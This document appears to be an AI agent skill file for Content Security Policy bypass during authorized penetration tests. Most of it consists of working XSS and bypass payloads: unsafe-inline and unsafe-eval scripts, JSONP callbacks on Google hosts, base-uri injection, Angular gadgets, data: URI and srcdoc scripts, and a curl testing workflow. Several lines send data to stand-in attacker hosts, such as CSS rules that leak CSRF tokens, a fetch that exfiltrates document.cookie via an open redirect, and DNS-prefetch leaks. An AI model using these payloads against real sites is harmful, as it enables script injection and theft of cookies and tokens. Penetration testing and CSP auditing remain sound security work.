---
id: csp-bypass
name: csp-bypass
description: >
  Content Security Policy (CSP) bypass specialist for authorized penetration tests.
  Covers unsafe-inline, unsafe-eval bypass, nonce prediction, base-uri injection,
  JSONP CDN abuse, open redirect to bypass allowed hosts, data: URI exploitation,
  iframe srcdoc, DNS prefetch, strict-dynamic bypass, and browser-specific quirks.
  Includes CSP Evaluator tool usage. Triggers on: CSP bypass, content security policy
  bypass, unsafe-inline, JSONP bypass, nonce bypass, strict-dynamic bypass,
  base-uri injection, CSP header analysis.
triggers:
  - CSP bypass
  - content security policy bypass
  - unsafe-inline
  - JSONP bypass
  - nonce bypass
  - strict-dynamic bypass
  - base-uri injection
  - CSP header analysis
  - CSP evaluator
  - script-src bypass
  - frame-src bypass
---

# CSP Bypass Techniques

## Authorization Gate

STOP. Confirm written authorization. CSP bypasses enable XSS to execute despite
protective headers — test only against in-scope targets.

---

## 1. CSP Fundamentals and Analysis

### 1.1 Reading a CSP Header

```bash
# Fetch CSP from target
curl -sI https://TARGET | grep -i content-security-policy
curl -sI https://TARGET | grep -i "csp\|content-security"

# Also check meta tag in HTML (weaker — can be bypassed by overriding with header)
curl -s https://TARGET | grep -i 'content-security-policy\|http-equiv'

# Full analysis with multiple sources
curl -sI https://TARGET/login && curl -sI https://TARGET/api && curl -sI https://TARGET/admin
# Note: CSP may differ per page
```

### 1.2 CSP Directives Reference

```
script-src     Controls JavaScript execution sources
style-src      Controls CSS sources
img-src        Controls image sources
connect-src    Controls fetch/XHR/WebSocket destinations
font-src       Controls font file sources
frame-src      Controls iframe sources
object-src     Controls plugin content (<object>, <embed>)
base-uri       Controls <base href=""> manipulation
form-action    Controls where forms can submit to
default-src    Fallback for directives not explicitly set
report-uri     Where CSP violations are reported
report-to      Modern version of report-uri

Dangerous values:
'unsafe-inline'  — allows inline <script> and event handlers
'unsafe-eval'    — allows eval(), Function(), setTimeout(string), etc.
'unsafe-hashes'  — allows specific inline handlers by hash
data:            — allows data: URIs (XSS via data:text/html,<script>)
*                — wildcard — allows any source
http:            — allows any HTTP source (can be http://evil.com)
```

---

## 2. Automated CSP Analysis

### 2.1 CSP Evaluator (Google)

```bash
# Google's CSP Evaluator: https://csp-evaluator.withgoogle.com/
# Command-line equivalent:
pip install csp-evaluator
python3 -c "
from csp_evaluator.evaluator import CspEvaluator
from csp_evaluator.parser import CspParser

csp = \"script-src 'self' https://ajax.googleapis.com; object-src 'none'\"
parsed = CspParser(csp).parse()
findings = CspEvaluator(parsed).evaluate()
for f in findings:
    print(f.severity, f.directive, f.description)
"

# Online API
curl -s -X POST https://csp-evaluator.withgoogle.com/getCSPEvaluation \
  -H "Content-Type: application/json" \
  -d '{"csp":"script-src https://ajax.googleapis.com; object-src none"}'
```

### 2.2 Nuclei CSP Analysis

```bash
nuclei -u https://TARGET \
  -t http/misconfiguration/http-missing-security-headers.yaml \
  -t http/misconfiguration/csp-injection.yaml \
  -o nuclei-csp.txt
```

---

## 3. unsafe-inline Bypass

### 3.1 When unsafe-inline is Present

```html
<!-- CSP: script-src 'self' 'unsafe-inline' -->
<!-- unsafe-inline allows all inline scripts — CSP provides no XSS protection -->

<!-- Classic inline XSS works directly -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
<select autofocus onfocus=alert(1)>
```

### 3.2 style-src unsafe-inline → CSS Exfiltration

```html
<!-- CSP: style-src 'self' 'unsafe-inline' — no script but has style inline -->
<!-- CSS-only data exfiltration (no JavaScript needed) -->

<style>
/* Exfiltrate CSRF token via CSS attribute selector + background-image */
input[name="csrf"][value^="a"] { background: url(https://ATTACKER/?csrf=a) }
input[name="csrf"][value^="b"] { background: url(https://ATTACKER/?csrf=b) }
/* ... generate for all chars ... */
</style>
```

```python
# Generate CSS exfiltration payload for all ASCII chars
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'
prefix = ''  # Build up known chars
css = ""
for c in chars:
    css += f'input[name="csrf"][value^="{prefix}{c}"] {{ background: url("https://ATTACKER/?c={prefix}{c}") }}\n'
print(css)
```

---

## 4. unsafe-eval Bypass

```html
<!-- CSP: script-src 'self' 'unsafe-eval' -->
<!-- unsafe-eval allows eval(), Function(), setTimeout/setInterval with strings -->

<!-- setTimeout with string (equivalent to eval) -->
<script>setTimeout("alert(document.domain)", 0)</script>
<script>setInterval("alert(1)", 9999)</script>

<!-- Function constructor (equivalent to eval) -->
<script>new Function("alert(1)")()</script>
<script>Function("alert(1)")()</script>
<script>window.constructor.constructor("alert(1)")()</script>

<!-- Through various indirection -->
<script>
[1].forEach(function(){
    (new Function("alert(document.domain)"))()
})
</script>

<!-- Via template literals + tag function -->
<script>
String.raw`${ eval("alert(1)") }`
</script>
```

---

## 5. Nonce Bypass

### 5.1 Nonce Prediction / Reuse

```bash
# CSP: script-src 'nonce-RANDOM_VALUE'
# If nonce is predictable or reused, bypass is possible

# Check if nonce changes per request:
for i in $(seq 1 5); do
  curl -s https://TARGET | grep -oP "nonce-[a-zA-Z0-9+/=]+"
done
# If same nonce appears → predictable/static nonce → inject script with that nonce

# Inject:
# <script nonce="THE_NONCE_VALUE">alert(1)</script>
```

### 5.2 Nonce Exfiltration via Injection Before Script Tags

```html
<!-- If injection point appears BEFORE a legitimate nonce'd script:
     CSP: script-src 'nonce-abc123'
     Page: <INJECTION_POINT><script nonce="abc123">legitimate()</script>

     Inject an incomplete tag that "absorbs" the nonce attribute:
-->

<!-- Inject: -->
<script src="https://ATTACKER/evil.js" 
<!-- This opens a tag — the nonce="abc123" from the next legitimate script
     becomes an attribute of this injected script tag in some parsers -->
```

### 5.3 Script Gadgets with Nonce

```html
<!-- If a CDN library is allowed AND the library has XSS gadgets: -->
<!-- CSP: script-src 'nonce-abc' https://cdnjs.cloudflare.com -->

<!-- Angular (if angular.js is loaded from allowed CDN): -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- Sanitize bypass via gadget injection (ng-app processes template without script tag) -->
```

---

## 6. Base-URI Injection

```html
<!-- CSP: script-src 'self' — no base-uri directive set -->
<!-- Missing base-uri allows attacker to inject <base href="https://evil.com"> -->
<!-- All relative script src="" URLs now load from evil.com -->

<!-- Inject: -->
<base href="https://evil.com/">
<!-- Then existing page scripts like <script src="/js/app.js"> become:
     <script src="https://evil.com/js/app.js"> -->

<!-- Host evil.com/js/app.js with malicious content — XSS achieved -->

<!-- Real-world example:
     App has <script src="/static/app.js"></script>
     Attacker injects <base href="https://attacker.com">
     Browser loads attacker.com/static/app.js
     CSP 'self' is satisfied because the relative URL was trusted
     
     FIX: Always set base-uri 'self' or base-uri 'none' in CSP -->
```

---

## 7. JSONP Endpoint Abuse (CDN and Same-Origin)

### 7.1 Google/jQuery CDN JSONP Bypass

```html
<!-- CSP: script-src https://www.google.com https://ajax.googleapis.com -->

<!-- Google has JSONP endpoints that execute arbitrary callbacks -->
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)//"></script>

<!-- google-analytics JSONP (historical — may be patched) -->
<script src="https://www.google-analytics.com/gtm/js?id=alert(1)//"></script>

<!-- accounts.google.com JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)//"></script>
```

### 7.2 Finding JSONP on Allowed Hosts

```bash
# Look for JSONP on every host in the script-src allowlist
ALLOWED_HOSTS=("cdn.example.com" "api.example.com" "static.example.com")

for host in "${ALLOWED_HOSTS[@]}"; do
  # Common JSONP parameter names
  for param in callback cb jsonp fn wrapper; do
    url="https://$host/search?$param=test123"
    response=$(curl -s "$url" | grep -i "test123")
    if [ -n "$response" ]; then
      echo "[JSONP] $url → $response"
    fi
  done
done

# Automated: use JSFuzz or similar to find callback reflection
```

### 7.3 Angular Gadget via CDN

```html
<!-- CSP: script-src 'self' https://ajax.googleapis.com -->
<!-- If target uses/allows AngularJS from googleapis CDN: -->

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>

<!-- Angular template injection bypasses CSP because no <script> tag needed -->
<!-- Works with ng-app, ng-controller, ng-expression anywhere on page -->
```

---

## 8. Open Redirect to CSP Bypass

```html
<!-- CSP: script-src https://TARGET.com -->
<!-- If TARGET.com has an open redirect:
     https://TARGET.com/redirect?url=https://evil.com/evil.js
     → This URL is "on" TARGET.com initially
     → Browser follows redirect to evil.com/evil.js
     → Some older browsers/proxies don't re-check after redirect

     Modern browsers DO check the final URL against CSP
     → Works in some edge cases with same-origin redirects
     → More useful for connect-src (fetch/XHR) SSRF bypass -->

<!-- connect-src bypass via open redirect (fetch follows redirects): -->
<script>
fetch('https://TARGET.com/redirect?url=https://evil.com/exfil?data=' + document.cookie)
</script>
<!-- CSP allows fetch to TARGET.com, redirect carries data to evil.com -->
```

---

## 9. data: URI and Blob Bypass

```html
<!-- CSP: script-src 'self' data: -->
<!-- data: in script-src allows data: URI scripts -->

<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>

<!-- base64 encoded -->
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>

<!-- object-src: none missing — data: via object -->
<!-- CSP: script-src 'self' — no object-src -->
<object data="data:text/html,<script>alert(1)</script>"></object>
<embed src="data:text/html,<script>alert(1)</script>"></embed>

<!-- iframe srcdoc (bypasses CSP for frame content) -->
<!-- CSP: frame-src 'self' — srcdoc is considered same-origin -->
<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>
<iframe srcdoc="<img src=x onerror=alert(parent.document.cookie)>"></iframe>
```

---

## 10. strict-dynamic Bypass

```html
<!-- CSP: script-src 'strict-dynamic' 'nonce-abc123' -->
<!-- strict-dynamic: scripts loaded by trusted (nonce'd) scripts inherit trust -->
<!-- If attacker can inject content into a nonce'd script or its DOM manipulation: -->

<!-- Attack: DOM clobbering to influence script.src before trust propagation -->
<!-- Attack: If nonce'd script does document.write(userInput) → writes inherit trust -->

<!-- Example — nonce'd script does: -->
<script nonce="abc123">
  var template = location.hash.slice(1);  // user-controlled
  document.write('<script src="' + template + '"><\/script>');
  // The written script inherits strict-dynamic trust from parent!
</script>

<!-- Attacker sets: #https://evil.com/payload.js -->
<!-- Written <script src="https://evil.com/payload.js"> executes despite CSP -->

<!-- Also: if app has DOM XSS and nonce'd script uses innerHTML with user input -->
```

---

## 11. Browser-Specific Quirks

### 11.1 Firefox Location.hash Bypass

```html
<!-- Firefox < specific version: location.hash not covered by CSP in some contexts -->
<!-- Generally patched — document for reference only -->
```

### 11.2 Chrome SVG Bypass

```html
<!-- SVG <use> element with external href may bypass CSP in some configurations -->
<svg>
  <use href="https://ALLOWED_CDN/file.svg#xss"></use>
</svg>

<!-- SVG filter-based CSS injection (Chrome specific) -->
<svg>
  <filter id="f1">
    <feComponentTransfer>
      <feFuncR type="table" tableValues="EXFIL_DATA"/>
    </feComponentTransfer>
  </filter>
</svg>
```

### 11.3 IE/Legacy Bypass (document for historical awareness)

```html
<!-- IE: vbscript: bypass (IE only) -->
<!-- <img src="x" onerror="vbscript:msgbox 1"> (IE-only) -->

<!-- Mhtml: protocol (IE-only) -->
<!-- data: works in IE even without data: in CSP (IE ignores CSP) -->
```

---

## 12. DNS Prefetch Leak

```html
<!-- CSP: default-src 'none'; img-src 'self' -->
<!-- DNS prefetch is NOT covered by CSP in most browsers -->
<!-- Allows data exfiltration even with strict CSP -->

<!-- Inject: -->
<link rel="dns-prefetch" href="//ATTACKER.com">

<!-- With data: -->
<link rel="dns-prefetch" href="//STOLEN_DATA.ATTACKER.com">

<!-- Via CSS (if style injection possible): -->
<style>
  @font-face { font-family: x; src: url(//STOLEN_DATA.ATTACKER.com/font); }
  body { font-family: x; }
</style>
```

---

## 13. Weak CSP Patterns Cheat Sheet

| CSP Pattern | Weakness | Bypass Method |
|---|---|---|
| `script-src *` | Wildcard allows any host | Load from evil.com directly |
| `script-src https:` | Any HTTPS host | Load from https://evil.com |
| `script-src 'unsafe-inline'` | Inline allowed | Inline `<script>alert(1)</script>` |
| `script-src 'unsafe-eval'` | eval() allowed | `eval("alert(1)")` |
| Missing `object-src` | Plugin content uncontrolled | `<object data="data:...">` |
| Missing `base-uri` | base tag injection | `<base href="https://evil.com">` |
| `script-src 'self'` + open redirect | Redirect from self | JSONP or redirect to external |
| `script-src cdn.com` + JSONP on cdn.com | JSONP callback | `<script src="cdn.com/api?cb=alert(1)">` |
| `script-src 'nonce-X'` + static nonce | Reused nonce | Use known nonce in injected script |
| `script-src 'strict-dynamic' 'nonce-X'` + DOM XSS in nonce'd script | Trust inheritance | DOM XSS in nonce'd script context |
| `connect-src 'self'` + open redirect | Fetch follows redirects | Fetch → open redirect → evil.com |
| `data:` in script-src | Data URI scripts | `<script src="data:,alert(1)">` |
| `frame-src 'self'` | srcdoc is self-origin | `<iframe srcdoc="<script>alert(1)">` |

---

## 14. Testing Workflow

```bash
# Step 1: Extract CSP
curl -sI https://TARGET | grep -i content-security-policy

# Step 2: Analyze with CSP Evaluator
# https://csp-evaluator.withgoogle.com/

# Step 3: Check for each bypass category:

# 3a: unsafe-inline present?
echo "CSP" | grep "unsafe-inline"

# 3b: JSONP candidates in script-src?
# List all allowed script hosts, probe each for JSONP

# 3c: Angular/Vue/React gadgets on allowed CDN?
# Check if angularjs.org or similar is in allowlist

# 3d: base-uri directive missing?
echo "CSP" | grep "base-uri" || echo "MISSING base-uri — inject <base href=...>"

# 3e: object-src directive missing?
echo "CSP" | grep "object-src" || echo "MISSING object-src — try <object data=data:..."

# 3f: nonce reuse?
for i in $(seq 1 10); do
  curl -s https://TARGET | grep -oP "nonce-[a-zA-Z0-9+/=]+" | head -1
done | sort | uniq -c

# Step 4: Test bypass in browser DevTools console or Burp
```

---

## Related Skills

- `xss-specialist` — XSS techniques that require CSP bypass to execute
- `frontend-xss-csp` — broader CSP auditing and header analysis
- `open-redirect` — open redirects as CSP bypass enablers
- `burp-extension-toolkit` — Param Miner for finding injection points
